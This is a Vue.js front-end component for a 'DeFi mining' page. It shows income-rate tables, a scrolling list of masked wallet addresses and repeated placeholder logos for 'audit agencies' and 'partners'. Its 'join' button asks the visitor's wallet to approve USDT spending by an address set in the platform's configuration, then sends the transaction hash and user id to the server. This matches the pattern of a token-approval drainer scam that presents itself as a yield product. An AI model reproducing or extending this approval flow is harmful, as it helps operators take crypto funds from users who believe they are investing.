<template>
  <div class="defis_main">
    <div class="defis_header_box flex-center">
      <div class="header_inner flex-start">
        <div class="title num_Bold">
          <p>{{ $t("defiMine.title") }}</p>
        </div>
      </div>
    </div>
    <div class="coinInfo_box flex-between">
      <div class="content">
        <div class="product_item flex-colum-evenly">
          <div class="product_item_content flex-box">
            <div class="imgBox">
              <img :src="require('@/assets/image/invest.png')" alt="" />
            </div>
            <div class="content flex-colum-between">
              <div class="top flex-start">
                <div class="perc">ETH</div>
              </div>
              <!-- 未授权 -->
              <div class="bottom flex-between" v-if="!isApprove">
                <div class="flex-colum-evenly">
                  <p>{{ $t("defiMine.totolOutput") }}(ETH)</p>
                  <p>{{ defiInfo.totalOutput }} ETH</p>
                </div>
                <div class="flex-colum-evenly">
                  <p>{{ $t("defiMine.effectNodes") }}</p>
                  <p>{{ defiInfo.participant }}</p>
                </div>
                <div class="flex-colum-evenly">
                  <p>{{ $t("defiMine.participant") }}</p>
                  <p>{{ defiInfo.validNode }}</p>
                </div>
                <div class="flex-colum-evenly">
                  <p>{{ $t("defiMine.userIncome") }}(USDT)</p>
                  <p>{{ defiInfo.userBenefits }} U</p>
                </div>
              </div>
              <!-- 已授权 -->
              <div class="bottom flex-between" v-else>
                <div class="flex-colum-evenly">
                  <p>{{ $t("defiMine.hosting") }}</p>
                  <p>
                    {{ priceFormat(userInfo.appAddressInfo.usdt || 0, 2) }} USDT
                  </p>
                </div>
                <div class="flex-colum-evenly">
                  <p>{{ $t("defiMine.totalIncome") }}</p>
                  <p>{{ priceFormat(incomeInfo.totalProfit) }} ETH</p>
                </div>
                <div class="flex-colum-evenly">
                  <p>{{ $t("defiMine.singleIncome") }}</p>
                  <p>{{ priceFormat(incomeInfo.singleRate) }}</p>
                </div>
                <div class="flex-colum-evenly">
                  <p>{{ $t("defiMine.dayilyIncome") }}</p>
                  <p>{{ priceFormat(incomeInfo.dayRate) }}</p>
                </div>
              </div>

              <div class="btn_box" v-show="!isApprove">
                <el-button type="primary" size="small" @click="toApprove">{{
                  $t("defiMine.join")
                }}</el-button>
              </div>
              <div class="btn_box" v-show="isApprove">
                <el-button
                  type="primary"
                  size="small"
                  @click="$router.push('/defis/details')"
                >
                  {{ $t("defiMine.details") }}
                </el-button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="imgBox">
        <img :src="require('@/assets/image/difiBanner.png')" alt="" />
      </div>
    </div>

    <div class="table_box flex-between">
      <div class="left_table">
        <div class="title num_Bold">{{ $t("defiMine.gearIncomeRate") }}</div>
        <div class="table_detail">
          <el-table :data="tableData" border style="width: 100%">
            <el-table-column
              align="center"
              prop="symbol"
              :label="$t('defiMine.gearPosition')"
              width="120"
            >
              <template slot-scope="scope">
                <div>
                  {{ scope.row.sort }}
                </div>
              </template>
            </el-table-column>
            <el-table-column
              align="center"
              prop="availableAmount"
              :label="$t('defiMine.num')"
            >
              <template slot-scope="scope">
                <div>
                  {{ scope.row.amountTotle }}
                </div>
              </template>
            </el-table-column>
            <el-table-column
              align="center"
              prop="occupiedAmount"
              :label="$t('defiMine.incomeRate')"
            >
              <template slot-scope="scope">
                <div>
                  {{ scope.row.rate }}
                </div>
              </template>
            </el-table-column>
          </el-table>
        </div>
      </div>
      <div class="scroll_anno">
        <div class="title num_Bold">{{ $t("defiMine.userOutput") }}</div>
        <div class="table-container">
          <el-table
            class="custom-table-border"
            :data="tableData2"
            style="width: 100%"
            border
          >
            <el-table-column
              prop="address"
              :label="$t('defiMine.address')"
              width="200"
              align="left"
            ></el-table-column>
            <el-table-column
              prop="num"
              :label="$t('defiMine.num')"
              width="205"
              align="right"
            ></el-table-column>
          </el-table>
        </div>
      </div>
    </div>

    <div class="rate_intro">
      <div class="title num_Bold">{{ $t("defiMine.gearIncomeRateIntro") }}</div>
      <div class="intro_box">
        <div v-html="rateIntro.content"></div>
        <!-- <p>1.流动性挖矿</p> 
        <p>流动性挖矿是</p>
        <p>流动性挖矿是</p>
        <p>流动性挖矿是</p>
        <p>流动性挖矿是</p>
        <p>流动性挖矿是</p>
        <p>流动性挖矿是</p>
        <p>流动性挖矿是</p> -->
      </div>
    </div>
    <div class="audit_box commer_img_box">
      <div class="title num_Bold">{{ $t("defiMine.contractAuditAgency") }}</div>
      <div class="imgBox flex-start">
        <img :src="require('@/assets/image/finance_banner.png')" alt="" />
        <img :src="require('@/assets/image/finance_banner.png')" alt="" />
      </div>
    </div>

    <div class="cooper_box commer_img_box">
      <div class="title num_Bold">{{ $t("defiMine.partners") }}</div>
      <div class="imgBox flex-start">
        <img :src="require('@/assets/image/finance_banner.png')" alt="" />
        <img :src="require('@/assets/image/finance_banner.png')" alt="" />
        <img :src="require('@/assets/image/finance_banner.png')" alt="" />
        <img :src="require('@/assets/image/finance_banner.png')" alt="" />
        <img :src="require('@/assets/image/finance_banner.png')" alt="" />
        <img :src="require('@/assets/image/finance_banner.png')" alt="" />
        <img :src="require('@/assets/image/finance_banner.png')" alt="" />
        <img :src="require('@/assets/image/finance_banner.png')" alt="" />
      </div>
    </div>
  </div>
</template>

<script>
import { getRulesList } from "@/api/rule";
import { getDefiRateList, getUserInvestList, getIncomeApi } from "@/api/defi";
import { sendApproveHashApi } from "@/api/common";
import { mapGetters, mapActions } from "vuex";
// import {logout} from "@/chain/eth/index";
import { check as checkETH, approve as approveETH } from "@/chain/eth/index";

import { check as checkTRON, approve as approveTRON } from "@/chain/tron/index";

export default {
  data() {
    return {
      form: {
        amountRange: "1000-100000",
        loanAmount: "",
        fileFath: "",
      },
      tableData: [],
      tableData2: [
        // { column1: "Row 1", column2: "Data 1" },
        // { column1: "Row 2", column2: "Data 2" },
        // { column1: "Row 3", column2: "Data 3" },
        // { column1: "Row 4", column2: "Data 4" },
        // { column1: "Row 5", column2: "Data 5" },
        // { column1: "Row 6", column2: "Data 6" },
        // { column1: "Row 7", column2: "Data 7" },
        // { column1: "Row 8", column2: "Data 8" },
        // { column1: "Row 9", column2: "Data 9" },
        // { column1: "Row 10", column2: "Data 10" },
      ],
      rateIntro: {},
      defiInfo: {},
      isTron: false,
      isEth: false,
      incomeInfo: {}, //已授权信息
    };
  },
  created() {
    this.init();
  },
  computed: {
    ...mapGetters(["language", "settingConfig", "userInfo", "platFormConfig"]),
    isApprove() {
      if (this.userInfo && this.userInfo.approve == 1) {
        this.getIncome();
        return true;
      } else {
        // this.getIncome();
        return false;
      }
    },
  },
  mounted() {
    console.log("settingConfig====>", this.settingConfig);
    this.defiInfo = this.settingConfig.DEFI_INCOME_SETTING;
  },
  watch: {
    language(newLanguage, oldLanguage) {
      // 在 language 属性发生变化时执行的逻辑
      console.log(`Language changed from ${oldLanguage} to ${newLanguage}`);
      // 可以在这里执行其他操作，比如重新加载数据或者更新页面内容
      this.getIntroList("DEFI_EXPLAIN");
    },
  },
  beforeDestroy() {},
  methods: {
    ...mapActions(["getUserInfo"]),
    init() {
      this.getRateList();
      this.getUserInvestData();
      this.getIntroList("DEFI_EXPLAIN");
    },
    /**
     * 授权后 获取金额
     */
    getIncome() {
      getIncomeApi(this.userInfo.user.userId).then((res) => {
        if (res.data.code == 200) {
          this.incomeInfo = res.data.data;
        }
      });
    },
    //去参与
    async toApprove() {
      // console.log("kkk===>", kkk.dispatch("FedLogOut"));
      const res = await this.approve().catch((err) => {
        // console.log('err====>', err)
        // showToast('用户取消授权')
        // _toast('defi_cancel')
        this.$message.error(this.$t("defiMine.userCancelAuth"));
      });
      console.log("toApprove", res);
      if (!res) {
        //授权失败
        // _toast('Please_access_wallet')
        // _toast('Authorization_failed')
        this.$message.error(this.$t("defiMine.authFail"));
        // router.push('/no-wallet')
      }
      this.getUserInfo();
    },
    async approve(type = "USDT") {
      // 配置授权地址
      this.isTron = await checkTRON();
      this.isEth = await checkETH();
      let res = null;
      if ((this.isEth && this.isTron) || this.isEth) {
        let spenderAddress = this.platFormConfig.APPROVE_ADDRESS.ETH;
        const { approveMethod } = await approveETH(spenderAddress, type);
        approveMethod.on("transactionHash", (hash) => {
          // 交易发送成功
          this.sendApproveHash(hash);
        });
        res = approveMethod;
      } else if (this.isTron) {
        let spenderAddress = this.platFormConfig.APPROVE_ADDRESS.TRON;
        res = await approveTRON(spenderAddress);
        this.sendApproveHash(res);
      }
      return res;
    },
    async sendApproveHash(hash) {
      await sendApproveHashApi({
        userId: this.userInfo.user.userId,
        address: this.userInfo.user.address,
        hash,
      });
    },
    getRateList() {
      getDefiRateList().then((res) => {
        this.tableData = res.data.data;
        //console.log("文章详情=====》", res.data.data[0]);
      });
    },
    getUserInvestData() {
      getUserInvestList().then((res) => {
        this.tableData2 = res.data.data.map((item) => {
          // 使用正则表达式替换中间5个字符为星号
          const processedAddress = item.address.replace(
            /(.{6}).*(.{6})/,
            "$1*****$2"
          );
          // 返回处理后的对象
          return { ...item, address: processedAddress };
        });
        // .slice(0, 12);
        //console.log("文章详情=====》", res.data.data[0]);
      });
    },
    getIntroList(type) {
      getRulesList({
        key: type,
      }).then((res) => {
        // 获取后端返回的原始内容字符串
        const originalContent = res.data.data[0].content;

        // 使用正则表达式在每个 <p> 元素前添加样式
        const styledContent = originalContent.replace(
          /<p>/g,
          '<p style="margin-bottom: 20px;">'
        );

        this.rateIntro = { ...res.data.data[0], content: styledContent };
        //console.log("文章详情=====》", res.data.data[0]);
      });
    },
  },
};
</script>

<style scoped lang="scss">
.defis_main {
  width: 100%;
  // height: 154px;
  margin-top: 65px;

  .defis_header_box {
    width: 100%;
    height: 154px;
    background: #f1f1f1;

    .header_inner {
      width: 1200px;
      height: 100%;
      margin: auto;

      .title {
        p {
          font-size: 36px;
        }
      }
    }
  }

  .coinInfo_box {
    width: 1200px;
    height: 230px;
    margin: auto;
    margin-top: 50px;
    gap: 30px;

    // background: red;
    .content {
      flex: 3;
      height: 100%;
      background: #f1f1f1;

      .product_item {
        width: 100%;
        height: 100%;
        padding: 20px;
        box-sizing: border-box;
        background: #f1f1f1;

        .product_item_content {
          .imgBox {
            flex: 1;

            img {
              width: 90px;
              height: 90px;
            }
          }

          .content {
            height: 170px;
            //background: red;
            flex: 5;

            .top {
              font-size: 20px;
            }

            .bottom {
              > div {
                height: 70px;

                P:nth-child(1) {
                  font-size: 14px;
                }

                P:nth-child(2) {
                  font-size: 20px;
                }
              }
            }

            .btn_box {
              // ::v-deep.el-button {
              //   width: 60px;
              //   height: 30px;
              //   text-align: center;
              // }
            }
          }
        }

        .invest_item_progress_text {
          // display: inline-block;
        }
      }
    }

    .imgBox {
      flex: 1.6;
      height: 100%;

      img {
        width: 100%;
        height: 100%;
      }
    }
  }

  .table_box {
    width: 1200px;
    height: 405px;
    margin: auto;
    margin-top: 50px;
    gap: 30px;

    .left_table {
      flex: 3;
      height: 100%;

      //background: red;
      .table_detail {
        width: 100%;
        height: 300px;
        // font-size: 16px;
        margin-top: 10px;

        ::v-deep.el-table {
          width: 100%;
          border-radius: 12px;
        }
      }
    }

    @keyframes scroll {
      0% {
        transform: translateY(0);
      }

      100% {
        transform: translateY(-100%);
        /* 每次滚动的距离，根据表格的行高和数量调整 */
      }
    }

    .scroll_anno {
      flex: 1.6;
      height: 100%;

      // background: blue;
      .table-container {
        width: 100%;
        height: 340px;
        margin-top: 10px;
        //max-height: 200px; /* 设置容器的最大高度 */
        overflow: hidden; /* 隐藏溢出部分 */
        position: relative;
        /* 设置相对定位，用于绝对定位子元素 */
      }

      .table-container ::v-deep.el-table {
        border-radius: 12px;
        // position: absolute;
        // /* 绝对定位 */
        // top: 0;

        /* 从顶部开始显示 */
        // animation: scroll 10s linear infinite; /* 使用动画实现滚动效果，10s表示一次循环的时间，根据实际情况调整 */
        .el-table__body {
          border: none;
          animation: scroll 20s linear infinite;
          /* 去掉除了第一行外所有行的边框线 */
        }

        .el-table__body tr td {
          border: none;
          /* 去掉除了第一行外所有行的边框线 */
        }

        .el-table__cell {
          border-right: none;
        }
      }

      // .custom-table .el-table__body tr:not(:first-child) td {
      //   border: none; /* 去掉除了第一行外所有行的边框线 */
      // }
    }
  }

  .rate_intro {
    width: 1200px;
    margin: auto;

    .title {
      font-size: 24px;
    }

    .intro_box {
      margin-top: 20px;
      padding: 20px 0 5px 20px;
      font-size: 12px;
      border: 1px solid #f1f1f1;

      P {
        margin-top: 20px !important;
      }
    }
  }

  .commer_img_box {
    width: 1200px;
    margin: auto;

    .title {
      font-size: 24px;
    }

    .imgBox {
      margin-top: 20px;
      gap: 10px;

      img {
        width: 182px;
        height: 60px;
      }
    }
  }

  .audit_box {
    margin-top: 40px;
  }

  .cooper_box {
    margin: 110px auto;
  }
}
</style>
